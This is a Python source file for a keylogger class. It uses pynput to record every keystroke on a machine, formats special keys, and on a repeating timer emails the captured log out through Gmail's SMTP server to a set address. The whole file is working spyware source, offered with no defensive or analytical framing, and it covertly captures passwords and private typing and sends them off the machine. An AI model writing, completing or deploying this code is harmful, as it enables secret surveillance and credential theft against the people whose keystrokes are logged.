from pynput import keyboard
import smtplib

import threading
class KeyLogger:

    # Define __init__ variables
    def __init__(self, time_interval: int, email: str, password: str) -> None:
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password

    # Create Log which all keystrokes will be appended to
    def append_to_log(self, string):
        assert isinstance(string, str)
        self.log = self.log + string

    # Map special keys to readable names
    def format_key(self, key):
        if hasattr(key, 'char') and key.char:
            return key.char
        else:
            key_mapping = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "[ENTER]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.caps_lock: "[CAPS LOCK]",
                keyboard.Key.cmd: "[COMMAND]",
                keyboard.Key.cmd_r: "[COMMAND RIGHT]",
                keyboard.Key.alt_gr: "[ALT GR]",
                keyboard.Key.f1: "[F1]",
                keyboard.Key.f2: "[F2]",
                keyboard.Key.f3: "[F3]",
                keyboard.Key.f4: "[F4]",
                keyboard.Key.f5: "[F5]",
                keyboard.Key.f6: "[F6]",
                keyboard.Key.f7: "[F7]",
                keyboard.Key.f8: "[F8]",
                keyboard.Key.f9: "[F9]",
                keyboard.Key.f10: "[F10]",
                keyboard.Key.f11: "[F11]",
                keyboard.Key.f12: "[F12]",
            }
            return key_mapping.get(key, f"[{key}]")

    # Create Keylogger
    def on_press(self, key):
        current_key = self.format_key(key)
        self.append_to_log(current_key)

    # Create underlying back structure which will publish emails
    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Create Report & Send Email
    def report_n_send(self) -> str:
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    # Start KeyLogger and Send Off Emails
    def start(self) -> str:
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()
